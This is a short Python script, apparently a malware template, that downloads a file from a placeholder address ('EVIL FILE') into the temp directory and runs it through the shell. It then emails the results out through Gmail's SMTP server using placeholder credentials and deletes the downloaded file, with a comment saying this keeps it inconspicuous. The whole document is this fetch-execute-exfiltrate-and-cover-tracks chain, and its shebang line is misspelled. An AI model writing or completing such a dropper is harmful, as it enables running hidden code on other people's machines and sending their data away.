#!/usr/in/env pyhton

import os
import re
import smtplib
import subprocess
import tempfile
import requests


def send_mail(email, password, message):
    # very likely outdated
    # create SMTP server instace
    server = smtplib.SMTP("smtp.gmail.com", 587)    # using Google's server
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()


def download(url):
    get_response = requests.get(url)
    file_name = url.split("/")[-1]
    with open(file_name, "wb") as out_file:
        out_file.write(get_response.content)


temp_directory = tempfile.gettempdir()
os.chdir(temp_directory)                    # changes working directory to temp
download("EVIL FILE")
result = subprocess.check_output("execute EVIL FILE", shell=True)
send_mail("EMAIL", "PASS", "MESSAGE")
os.remove("EVIL FILE")                      # removes the file to be inconspicuous
